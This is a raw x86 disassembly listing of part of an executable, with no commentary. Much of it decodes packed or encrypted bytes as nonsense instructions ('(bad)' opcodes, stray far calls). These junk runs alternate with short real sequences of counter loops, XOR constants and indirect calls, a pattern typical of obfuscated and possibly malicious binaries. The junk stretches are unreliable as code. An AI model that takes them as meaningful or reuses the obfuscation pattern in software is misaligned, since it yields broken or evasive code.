  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0xf7406797
  40b7b0:	std    
  40b7b1:	jge    0x40b799
  40b7b3:	jle    0x40b833
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b780
  40b7ba:	adc    DWORD PTR [edx-0x5d6f3987],edi
  40b7c0:	adc    DWORD PTR [eax+0x5454c76d],ecx
  40b7c6:	push   edi
  40b7c7:	adc    DWORD PTR [edi+eax*4-0x68],0xfffffffa
  40b7cc:	lock scas al,BYTE PTR es:[edi]
  40b7ce:	mov    esp,0x5bfb8c13
  40b7d3:	(bad)  
  40b7d5:	add    esp,esi
  40b7d7:	lea    ebx,[ebx+0x14]
  40b7da:	lods   al,BYTE PTR ds:[esi]
  40b7db:	mov    edi,0xc1e0dab3
  40b7e0:	cmp    DWORD PTR ds:0xe9561b30,0xffffffa6
  40b7e7:	stos   BYTE PTR es:[edi],al
  40b7e8:	std    
  40b7e9:	dec    ebp
  40b7ea:	mov    ds:0x2caff71a,al
  40b7ef:	or     ch,BYTE PTR [ebp-0x3a7d9c80]
  40b7f5:	loopne 0x40b83e
  40b7f7:	push   es
  40b7f8:	fsub   QWORD PTR [edx+0x2087cffd]
  40b7fe:	push   es
  40b7ff:	ins    BYTE PTR es:[edi],dx
  40b800:	out    dx,al
  40b801:	mov    ch,0xc3
  40b803:	das    
  40b804:	ins    BYTE PTR es:[edi],dx
  40b805:	sbb    cl,0x58
  40b808:	push   edx
  40b809:	icebp  
  40b80a:	popa   
  40b80b:	or     BYTE PTR ds:0x371f0e58,bl
  40b811:	pop    edi
  40b812:	cmp    ch,BYTE PTR [ebp-0xaae1345]
  40b818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b819:	sbb    eax,0x4651ec82
  40b81e:	dec    edi
  40b81f:	das    
  40b820:	push   edi
  40b821:	xchg   edx,eax
  40b822:	ret    
  40b823:	add    esi,DWORD PTR [ebp-0x52]
  40b826:	mov    edi,0x2c27b34b
  40b82b:	sub    BYTE PTR [ebp-0x73],cl
  40b82e:	or     dh,BYTE PTR [edx-0x39]
  40b831:	push   cs
  40b832:	cmp    BYTE PTR [eax],bl
  40b834:	or     ecx,eax
  40b836:	and    al,0x5f
  40b838:	cmp    edx,DWORD PTR [edi]
  40b83a:	mov    esi,0x7a1f6d85
  40b83f:	xchg   ecx,eax
  40b840:	dec    esp
  40b841:	lds    edi,FWORD PTR [ebp+0x16708446]
  40b847:	out    dx,al
  40b848:	mov    esp,0x81d9dd48
  40b84d:	sahf   
  40b84e:	aaa    
  40b84f:	fbld   TBYTE PTR [ecx]
  40b851:	push   ss
  40b852:	push   esp
  40b853:	or     eax,0x712aaffc
  40b858:	add    eax,0xd429a501
  40b85d:	enter  0x7e41,0xba
  40b861:	cmp    ebp,DWORD PTR [ebx-0x67a0751c]
  40b867:	lds    edx,FWORD PTR [edi]
  40b869:	pop    ss
  40b86a:	rcr    BYTE PTR [ebx+0x7489c5da],cl
  40b870:	xchg   ebp,eax
  40b871:	rcl    DWORD PTR [edi],cl
  40b873:	daa    
  40b874:	xor    cl,dh
  40b876:	stos   BYTE PTR es:[edi],al
  40b877:	adc    al,0x12
  40b879:	mov    edi,fs
  40b87b:	push   esp
  40b87c:	sti    
  40b87d:	(bad)  
  40b87e:	cli    
  40b87f:	xor    DWORD PTR [ebx],0x82982da2
  40b885:	mov    ecx,0xcec626c2
  40b88a:	std    
  40b88b:	push   ds
  40b88c:	pop    esp
  40b88d:	jg     0x40b8fb
  40b88f:	push   ecx
  40b890:	and    eax,0x207a7665
  40b895:	data16 mov al,0xa8
  40b898:	pop    ebx
  40b899:	push   ecx
  40b89a:	fwait
  40b89b:	cmp    al,0x17
  40b89d:	pusha  
  40b89e:	int    0xf1
  40b8a0:	cs std 
  40b8a2:	fsubr  st(2),st
  40b8a4:	mov    WORD PTR [esi+0x24],?
  40b8a7:	mov    ds,edx
  40b8a9:	mov    BYTE PTR [ebp+0x21e4046a],al
  40b8af:	mov    ecx,DWORD PTR [eax+0x39]
  40b8b2:	or     al,0x65
  40b8b4:	sbb    al,0x35
  40b8b6:	cmp    cl,cl
  40b8b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8b9:	fstp   DWORD PTR [esi]
  40b8bb:	rcl    BYTE PTR [edi],1
  40b8bd:	sub    eax,0xd1bac5b
  40b8c2:	adc    DWORD PTR [eax+ebp*4],ecx
  40b8c5:	(bad)  
  40b8c6:	aam    0x3a
  40b8c8:	frstor [edx+0x27]
  40b8cb:	mov    bh,0x7e
  40b8cd:	ret    0x60d6
  40b8d0:	jmp    0x9754:0x162a006f
  40b8d7:	mov    al,BYTE PTR [ebp-0x4fee5fd9]
  40b8dd:	(bad)  
  40b8de:	imul   edx,DWORD PTR [ecx+0x17],0x5a65ec2a
  40b8e5:	push   0xffffffbe
  40b8e7:	or     DWORD PTR [ebx],edi
  40b8e9:	mov    ds:0x86d6557,al
  40b8ee:	inc    esp
  40b8ef:	push   ds
  40b8f0:	sub    bh,ah
  40b8f2:	cmp    al,0x60
  40b8f4:	int    0x5e
  40b8f6:	mov    ebx,0x8978c61b
  40b8fb:	jne    0x40b8e9
  40b8fd:	sbb    ecx,DWORD PTR ds:0x4306c6
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430616
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43061e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x430626,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42efa8,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42efac,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42efa0,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	add    BYTE PTR [ebx-0x80],0xeb
  40b963:	mov    bh,0x3e
  40b965:	clc    
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b95f
  40b96d:	pop    ebp
  40b96e:	mov    WORD PTR [eax-0x26],cs
  40b971:	pop    ebp
  40b972:	xchg   esi,eax
  40b973:	es cld 
  40b975:	add    DWORD PTR [edx+0x7178eafc],esp
  40b97b:	xchg   BYTE PTR [esi],dl
  40b97d:	arpl   si,ax
  40b97f:	mov    al,BYTE PTR [edx+0x75cc1b1b]
  40b985:	push   esi
  40b986:	arpl   WORD PTR [edi-0x48],si
  40b989:	sbb    cl,BYTE PTR [ebp-0x48]
  40b98c:	and    al,0xe
  40b98e:	lods   eax,DWORD PTR ds:[esi]
  40b98f:	push   es
  40b990:	mov    gs,WORD PTR [eax+0x10d27752]
  40b996:	dec    edi
  40b997:	adc    edi,DWORD PTR [eax+ebx*4+0x7c264d77]
  40b99e:	pop    ss
  40b99f:	xlat   BYTE PTR ds:[ebx]
  40b9a0:	fsubr  st(5),st
  40b9a2:	int3   
  40b9a3:	in     eax,0x2a
  40b9a5:	push   es
  40b9a6:	inc    edx
  40b9a7:	inc    BYTE PTR [eax]
  40b9a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9ab:	mov    ecx,0xb830a2c9
  40b9b0:	push   ebp
  40b9b1:	xlat   BYTE PTR ds:[ebx]
  40b9b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b3:	scas   al,BYTE PTR es:[edi]
  40b9b4:	inc    eax
  40b9b5:	xor    ax,0xb4c3
  40b9b9:	retf   0xb568
  40b9bc:	out    dx,al
  40b9bd:	push   esp
  40b9be:	leave  
  40b9bf:	fidiv  WORD PTR [esi]
  40b9c1:	push   ss
  40b9c2:	getsec 
  40b9c4:	push   ds
  40b9c5:	shl    al,0x3a
  40b9c8:	cmp    al,0x14
  40b9ca:	data16 imul BYTE PTR [esi+0x77]
  40b9ce:	mov    BYTE PTR [eax-0x3d836255],ah
  40b9d4:	data16 adc BYTE PTR [esi-0x1a],dh
  40b9d8:	out    0xb8,al
  40b9da:	jb     0x40b999
  40b9dc:	fcomp  QWORD PTR [edi+0x5c250da9]
  40b9e2:	into   
  40b9e3:	sbb    eax,0xa66db499
  40b9e8:	retf   
  40b9e9:	ror    DWORD PTR [ebx],cl
  40b9eb:	aad    0xa0
  40b9ed:	cmp    al,0x23
  40b9ef:	ins    BYTE PTR es:[edi],dx
  40b9f0:	imul   eax,DWORD PTR ds:0x749caa36,0x2ec8f29f
  40b9fa:	and    esp,eax
  40b9fc:	pop    edi
  40b9fd:	xchg   edx,eax
  40b9fe:	fldenv [ecx+ebx*1]
  40ba01:	(bad)  
  40ba02:	xchg   edx,eax
  40ba03:	fdiv   DWORD PTR [eax]
  40ba05:	stos   BYTE PTR es:[edi],al
  40ba06:	or     ebp,DWORD PTR [ebx-0x5a]
  40ba09:	(bad)  [edx-0x1ff808bc]
  40ba0f:	loopne 0x40ba46
  40ba11:	or     dl,BYTE PTR [edi]
  40ba13:	or     esi,esp
  40ba15:	adc    DWORD PTR [ebx-0x79],ebp
  40ba18:	xchg   ebp,eax
  40ba19:	clc    
  40ba1a:	push   edx
  40ba1b:	inc    BYTE PTR [eax+0xd098019]
  40ba21:	pop    ds
  40ba22:	xchg   ebp,eax
  40ba23:	out    0x3d,al
  40ba25:	jmp    0x40ba5e
  40ba27:	pop    esp
  40ba28:	aas    
  40ba29:	cwde   
  40ba2a:	daa    
  40ba2b:	cli    
  40ba2c:	mov    ?,WORD PTR [edx+0x61]
  40ba2f:	lds    esp,FWORD PTR [edi+0x2126c711]
  40ba35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba36:	ret    
  40ba37:	mov    BYTE PTR gs:[ebp+0x656464df],bl
  40ba3e:	cmp    BYTE PTR [ebx+0x1da90cc2],ch
  40ba44:	xor    DWORD PTR [esi+edx*1-0x5f],ecx
  40ba48:	sub    dh,BYTE PTR [ecx-0x379a3ec0]
  40ba4e:	or     al,0xe1
  40ba50:	outs   dx,DWORD PTR ds:[esi]
  40ba51:	dec    eax
  40ba52:	push   esp
  40ba53:	das    
  40ba54:	mov    cl,0xfe
  40ba56:	test   al,0x48
  40ba58:	pop    ebx
  40ba59:	push   ebp
  40ba5a:	(bad)  
  40ba5b:	sahf   
  40ba5c:	xchg   edx,eax
  40ba5d:	push   esp
  40ba5e:	mov    eax,0x3d4dc05c
  40ba63:	and    DWORD PTR [edx+ebx*8-0x2e61b6e6],0x6d469fb7
  40ba6e:	pop    edx
  40ba6f:	add    dh,BYTE PTR [ecx+0x3e75e489]
  40ba75:	enter  0x2954,0xb
  40ba79:	stos   DWORD PTR es:[edi],eax
  40ba7a:	mov    gs,eax
  40ba7c:	sub    edx,DWORD PTR [esi+0x7690bd89]
  40ba82:	sbb    eax,0x23f542a8
  40ba87:	pop    ebp
  40ba88:	int3   
  40ba89:	call   0x7b0e:0xc4a98f3d
  40ba90:	mov    ah,0x31
  40ba92:	mov    bh,0x9f
  40ba94:	in     eax,dx
  40ba95:	sub    bh,dh
  40ba97:	call   0xd3a0:0x64824055
  40ba9e:	lods   eax,DWORD PTR ds:[esi]
  40ba9f:	dec    edx
  40baa0:	stos   DWORD PTR es:[edi],eax
  40baa1:	mov    esp,0xcd54487d
  40baa6:	retf   0x9e95
  40baa9:	jne    0x40ba51
  40baab:	or     al,0xf7
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42efa0,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430616,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42efa8,0x42ef94
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ef9c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ef9c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ef9c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ef9c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ed54
  40bb1b:	cmp    DWORD PTR ds:0x42ef9c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x4306d6
  40bb2e:	xor    DWORD PTR ds:0x430636,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x430632,0x43061a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	test   al,0xac
  40bb58:	cmp    ch,BYTE PTR [ebx]
  40bb5a:	(bad)  
  40bb5b:	stc    
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bb4e
  40bb63:	cmp    DWORD PTR [eax],edi
  40bb65:	push   edx
  40bb66:	pop    esp
  40bb67:	icebp  
  40bb68:	lahf   
  40bb69:	add    esp,ebp
  40bb6b:	jg     0x40bbd5
  40bb6d:	retf   
  40bb6e:	sub    edi,DWORD PTR [esi+0x1a2f3c7a]
  40bb74:	xchg   edi,eax
  40bb75:	(bad)  
  40bb76:	add    BYTE PTR [eax],dh
  40bb78:	jmp    0x40bb54
  40bb7a:	sub    al,0x2b
  40bb7c:	ror    BYTE PTR [eax+ebx*4-0x780d5ac0],0x3f
  40bb84:	or     ebx,DWORD PTR [ecx+eax*2+0x6]
  40bb88:	imul   al
  40bb8a:	out    0xe5,al
  40bb8c:	lock int3 
  40bb8e:	push   0x39c5335d
  40bb93:	cmp    BYTE PTR [esi],bl
  40bb95:	cmp    eax,0x285d5f5b
  40bb9a:	fild   QWORD PTR [eax+0x3c]
  40bb9d:	dec    esi
  40bb9e:	xchg   ecx,eax
  40bb9f:	mov    ds:0xc83fa7ef,eax
  40bba4:	stos   BYTE PTR es:[edi],al
  40bba5:	stos   BYTE PTR es:[edi],al
  40bba6:	in     eax,0xaa
  40bba8:	test   eax,0xd35522fa
  40bbad:	pop    ebx
  40bbae:	add    esi,DWORD PTR [ebp+0x5448748a]
  40bbb4:	retf   0xe6ce
  40bbb7:	loop   0x40bbfe
  40bbb9:	fwait
  40bbba:	and    BYTE PTR [ebx],ch
  40bbbc:	mov    edx,0x5b82a75e
  40bbc1:	addr16 pop edx
  40bbc3:	xchg   ebx,eax
  40bbc4:	or     ebx,DWORD PTR [esi+0x54]
  40bbc7:	xor    dl,BYTE PTR [eax+eax*2+0x77332c96]
  40bbce:	out    dx,al
  40bbcf:	lahf   
  40bbd0:	pushf  
  40bbd1:	push   es
  40bbd2:	mov    ebp,0xefec4262
  40bbd7:	(bad)  
  40bbd8:	call   0xf8c5:0x807db2ff
  40bbdf:	pushf  
  40bbe0:	cmp    ebp,DWORD PTR ds:0x664da828
  40bbe6:	add    ch,BYTE PTR [edi]
  40bbe8:	pop    ds
  40bbe9:	stc    
  40bbea:	mov    cl,0x8
  40bbec:	(bad)  
  40bbed:	or     al,0x34
  40bbef:	out    dx,eax
  40bbf0:	pop    ebp
  40bbf1:	push   DWORD PTR [edi-0xdf7d7ab]
  40bbf7:	jns    0x40bbc9
  40bbf9:	mov    al,0xac
  40bbfb:	mov    eax,ds:0xce38c9d2
  40bc00:	jl     0x40bb9a
  40bc02:	push   esp
  40bc03:	mov    dl,0xab
  40bc05:	hlt    
  40bc06:	scas   al,BYTE PTR es:[edi]
  40bc07:	jnp    0x40bbcd
  40bc09:	mov    ecx,0x9c03a0a4
  40bc0e:	adc    al,ah
  40bc10:	adc    DWORD PTR [edi-0x13f1a355],0xfd28e32b
  40bc1a:	les    esp,FWORD PTR [edx+0x5f]
  40bc1d:	out    0x3f,al
  40bc1f:	ror    DWORD PTR [edi],cl
  40bc21:	and    dl,BYTE PTR [ecx+0x3b191a1d]
  40bc27:	aaa    
  40bc28:	cmc    
  40bc29:	pop    eax
  40bc2a:	ror    BYTE PTR [eax],cl
  40bc2c:	xchg   ebp,eax
  40bc2d:	mov    BYTE PTR [edi+edx*1+0x50ece14b],dh
  40bc34:	jge    0x40bc8c
  40bc36:	xor    al,0x82
  40bc38:	outs   dx,BYTE PTR ds:[esi]
  40bc39:	jl     0x40bcba
  40bc3b:	repnz aad 0x58
  40bc3e:	(bad)  
  40bc3f:	and    al,0xcd
  40bc41:	pop    ebx
  40bc42:	dec    edi
  40bc43:	out    dx,eax
  40bc44:	les    esp,FWORD PTR [eax+0x32]
  40bc47:	mov    WORD PTR [edx],gs
  40bc49:	mov    ds:0x38906c88,al
  40bc4e:	pop    esi
  40bc4f:	sub    bh,BYTE PTR [ecx]
  40bc51:	outs   dx,DWORD PTR ds:[esi]
  40bc52:	pop    ebx
  40bc53:	mov    ebx,0x12d40ad6
  40bc58:	mov    edi,0x121e52eb
  40bc5d:	sub    esp,DWORD PTR [ecx]
  40bc5f:	cld    
  40bc60:	out    0x1,eax
  40bc62:	jbe    0x418fc353
  40bc68:	adc    al,0x7b
  40bc6a:	pop    es
  40bc6b:	or     cl,0x71
  40bc6e:	mov    ss,WORD PTR [esi+0xbb57009]
  40bc74:	stos   DWORD PTR es:[edi],eax
  40bc75:	call   0xd4fe61ee
  40bc7a:	inc    esi
  40bc7b:	push   0x19a9f42d
  40bc80:	sub    ecx,edx
  40bc82:	pop    edx
  40bc83:	fmul   st(3),st
  40bc85:	mov    WORD PTR [eax+0x43570c54],ds
  40bc8b:	outs   dx,DWORD PTR ds:[esi]
  40bc8c:	mov    edx,0x53a92365
  40bc91:	(bad)  
  40bc92:	neg    DWORD PTR [eax-0x38]
  40bc95:	dec    ecx
  40bc96:	inc    eax
  40bc97:	mov    ebx,0x635857fa
  40bc9c:	imul   esp,DWORD PTR [edi],0xdcc559c
  40bca2:	les    eax,FWORD PTR [ebx]
  40bca4:	ret    
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x4306d2,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x4306ce,0x42efb0
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x43063e,0x4306c6
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x430642,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x430642
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x430642,ecx
  40bcf2:	cmp    DWORD PTR ds:0x430642,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x430642,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x430622
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42ebac
  40bd1f:	cmp    DWORD PTR ds:0x430642,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x430642
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x430642,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e8f2,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430616
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x4306da,0x4306d2
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ef90,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x430632,0x19
  40bd88:	cmp    DWORD PTR ds:0x430632,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x430632,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42ebb0
  40bdad:	mov    ecx,DWORD PTR ds:0x430632
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x430632,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x4306da
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	fstp   DWORD PTR [ebx]
  40bdde:	pop    edi
  40bddf:	int3   
  40bde0:	mov    al,0xfa
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40bd79
  40bde9:	pop    ebx
  40bdea:	pop    ss
  40bdeb:	xchg   esp,eax
  40bded:	mov    ah,0x1
  40bdef:	out    0x47,al
  40bdf1:	stos   WORD PTR es:[edi],ax
  40bdf3:	sahf   
  40bdf4:	(bad)  
  40bdf5:	xchg   edx,eax
  40bdf6:	hlt    
  40bdf7:	(bad)  
  40bdf8:	fild   QWORD PTR [ebx-0xe]
  40bdfb:	ss mov edx,0x2fd0dffb
  40be01:	push   ds
  40be02:	push   es
  40be03:	xchg   esp,eax
  40be04:	ret    
  40be05:	nop
  40be06:	out    dx,al
  40be07:	popf   
  40be08:	fadd   DWORD PTR [ebx+0x13dc8b27]
  40be0f:	ja     0x40be73
  40be11:	mov    edi,0x5f576272
  40be16:	lea    eax,[ecx-0x4a]
  40be19:	(bad)  
  40be1a:	call   0x2299:0x9a86873b
  40be21:	sbb    eax,0x93cc5592
  40be26:	not    DWORD PTR ds:0x3c864697
  40be2c:	imul   ebx,esi,0x57310de4
  40be32:	gs mov ebx,0x62abd5f8
  40be38:	add    DWORD PTR [edx],edi
  40be3a:	cmp    BYTE PTR [edi-0x6093f04],dh
  40be40:	hlt    
  40be41:	es stc 
  40be43:	mov    edi,0x462bb7fb
  40be48:	add    DWORD PTR [bp+di],edi
  40be4b:	shr    DWORD PTR [edi-0x3d],1
  40be4e:	push   edi
  40be4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be50:	or     DWORD PTR [edi],0x7f
  40be53:	fisubr DWORD PTR [ecx-0x4349a953]
  40be59:	or     eax,0xd46120c6
  40be5e:	(bad)  
  40be5f:	int    0x3b
  40be61:	sahf   
  40be62:	je     0x40be4c
  40be64:	ins    BYTE PTR es:[edi],dx
  40be65:	push   esi
  40be66:	xor    BYTE PTR [ecx],dl
  40be68:	dec    edx
  40be69:	js     0x40bed1
  40be6b:	sub    cl,bh
  40be6d:	xor    bh,BYTE PTR [ecx]
  40be6f:	sub    al,0x2b
  40be71:	sub    cl,BYTE PTR [ebx+eiz*1-0xd]
  40be75:	add    eax,0xe2149826
  40be7a:	and    eax,0xd36ded82
  40be7f:	add    eax,0xbc647db4
  40be84:	xchg   esp,eax
  40be85:	inc    eax
  40be86:	cmp    al,0xab
  40be88:	imul   esp,DWORD PTR [ebx+0x67],0x2c03a464
  40be8f:	add    DWORD PTR [edi+edi*1-0x35],eax
  40be93:	lds    esp,FWORD PTR [ebx+0x3046e69b]
  40be99:	aad    0x9a
  40be9b:	retf   0x8560
  40be9e:	dec    esp
  40be9f:	lods   al,BYTE PTR ds:[esi]
  40bea0:	(bad)  [edi+0x7edd02e8]
  40bea6:	jmp    0x40bf12
  40bea8:	xchg   ecx,eax
  40bea9:	scas   eax,DWORD PTR es:[edi]
  40beaa:	dec    edi
  40beab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beac:	pop    ss
  40bead:	pop    es
  40beae:	iret   
  40beaf:	shl    DWORD PTR [ecx],1
  40beb1:	cmp    al,0x79
  40beb3:	stos   DWORD PTR es:[edi],eax
  40beb4:	cmp    al,0x10
  40beb6:	adc    BYTE PTR [edx+0x27],al
  40beb9:	shl    DWORD PTR ds:0xcbcfe196,1
  40bebf:	lods   eax,DWORD PTR ds:[esi]
  40bec0:	clc    
  40bec1:	dec    edi
  40bec2:	arpl   WORD PTR [edx-0x73],bp
  40bec5:	ins    DWORD PTR es:[edi],dx
  40bec6:	call   0xfdcd7860
  40becb:	push   edi
  40becc:	(bad)  
  40becd:	xchg   esi,eax
  40bece:	xchg   esi,eax
  40becf:	(bad)  
  40bed1:	jno    0x40be98
  40bed3:	or     DWORD PTR [ecx+0x7b],eax
  40bed6:	and    eax,0x3d776e64
  40bedb:	jp     0x40bedd
  40bedd:	repnz pop ebp
  40bedf:	(bad)  
  40bee0:	jp     0x40be69
  40bee2:	mov    eax,0x909a8a3b
  40bee7:	ficom  WORD PTR [ecx-0x4812b15b]
  40beed:	mov    esi,0x68cb67d2
  40bef2:	add    eax,0xc464c2fc
  40bef7:	or     DWORD PTR [edi-0x857d916],ecx
  40befd:	nop
  40befe:	test   DWORD PTR [edi+edx*2+0x75],0x7881f92b
  40bf06:	out    0xe4,al
  40bf08:	mov    al,ds:0x6a532ce9
  40bf0d:	rol    BYTE PTR [ecx],cl
  40bf0f:	mov    dh,0x94
  40bf11:	jo     0x40bf35
  40bf13:	sub    cl,BYTE PTR [ecx]
  40bf15:	psubw  mm0,QWORD PTR [eax]
  40bf18:	iret   
  40bf19:	sti    
  40bf1a:	adc    cl,BYTE PTR [edi]
  40bf1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf1d:	lea    esp,[ecx+0x6d]
  40bf20:	lahf   
  40bf21:	(bad)  
  40bf22:	leave  
  40bf23:	push   es
  40bf24:	jecxz  0x40bf51
  40bf26:	dec    ebx
  40bf27:	outs   dx,DWORD PTR ds:[esi]
  40bf28:	js     0x40beb5
  40bf2a:	inc    ebp
  40bf2b:	in     al,dx
  40bf2c:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf2f:	sbb    DWORD PTR ds:0x430626,0xe94
  40bf39:	jmp    0x40c097
  40bf3e:	fmul   QWORD PTR [edi+0x7d6d4fad]
  40bf44:	cld    
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	adc    eax,0x71ddc4af
  40bf4f:	cld    
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf6e
  40bf57:	data16 jmp 0x40bfd5
  40bf5a:	dec    esi
  40bf5b:	push   ss
  40bf5c:	sub    ch,BYTE PTR [eax]
  40bf5e:	int3   
  40bf5f:	in     eax,dx
  40bf60:	jmp    0xb9e5815c
  40bf65:	loopne 0x40bf7d
  40bf67:	leave  
  40bf68:	out    dx,al
  40bf69:	pop    edx
  40bf6a:	xchg   ebp,eax
  40bf6b:	xchg   edi,eax
  40bf6c:	fs mov ah,0x98
  40bf6f:	inc    ebx
  40bf70:	mov    al,0x6b
  40bf72:	lahf   
  40bf73:	inc    ebx
  40bf74:	test   DWORD PTR [ebx],esp
  40bf76:	mov    ebp,edx
  40bf78:	popf   
  40bf79:	aad    0x18
  40bf7b:	lea    eax,[ebx]
  40bf7d:	adc    al,0x10
  40bf7f:	ins    DWORD PTR es:[edi],dx
  40bf80:	out    dx,al
  40bf81:	(bad)
  40bf84:	setno  BYTE PTR [ecx+eiz*4+0x2d1863f4]
  40bf8c:	add    esp,ebx
  40bf8e:	xor    DWORD PTR [ecx+0x6],ecx
  40bf91:	dec    edx
  40bf92:	sub    eax,0x2a447b28
  40bf97:	iret   
  40bf98:	les    ecx,FWORD PTR [edi]
  40bf9a:	int    0x62
  40bf9c:	(bad)  
  40bf9d:	fcmovbe st,st(7)
  40bf9f:	jne    0x40bff1
  40bfa1:	inc    esi
  40bfa2:	shl    eax,0xca
  40bfa5:	mov    ch,0x79
  40bfa7:	push   ebp
  40bfa8:	pop    eax
  40bfa9:	fsave  [ebp-0x1d]
  40bfad:	adc    al,0xd5
  40bfaf:	cdq    
  40bfb0:	out    0xfe,al
  40bfb2:	inc    ebx
  40bfb3:	pop    ebx
  40bfb4:	sub    ch,dl
  40bfb6:	and    BYTE PTR [eax+0x507ee010],al
  40bfbc:	enter  0x1c7f,0xfc
  40bfc0:	popa   
  40bfc1:	adc    al,0xce
  40bfc3:	cmp    bl,dh
  40bfc5:	(bad)
  40bfc8:	pop    esi
  40bfc9:	adc    dl,BYTE PTR ds:0xe7c4f6c1
